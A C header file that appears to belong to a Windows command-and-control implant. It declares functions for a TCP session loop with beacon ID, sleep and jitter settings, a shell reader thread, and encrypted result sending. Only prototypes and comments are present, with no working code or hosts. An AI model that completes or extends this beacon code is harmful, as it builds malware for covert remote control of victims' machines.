#pragma once
#include <windows.h>
#include <stdint.h>

#define MAX_ENVELOPE (10 * 1024 * 1024)

int  session_init(void);
SOCKET session_connect(const char *host, uint16_t port);
int  session_write(SOCKET sock, const uint8_t *data, int len);
int  session_read(SOCKET sock, uint8_t *out, int *out_len);
void session_loop(SOCKET sock, uint8_t *session_key, uint32_t beacon_id,
                  DWORD *sleep_ms, DWORD *jitter_pct);
void session_cleanup(SOCKET sock);

/* safe_session_write: thread-safe envelope write (used by shell reader thread). */
int safe_session_write(SOCKET sock, const uint8_t *data, int len);

/* send_result_session: builds header+RunRep, encrypts, sends via TCP. */
int send_result_session(SOCKET sock, uint32_t label, uint8_t type, uint8_t code,
                        uint16_t flags, const char *output,
                        uint8_t *session_key);

/* send_result_raw_session: builds header+raw data, encrypts, sends via TCP. */
int send_result_raw_session(SOCKET sock, uint32_t label, uint8_t type,
                            uint16_t flags, uint32_t identifier,
                            const uint8_t *data, uint32_t data_len,
                            uint8_t *session_key);
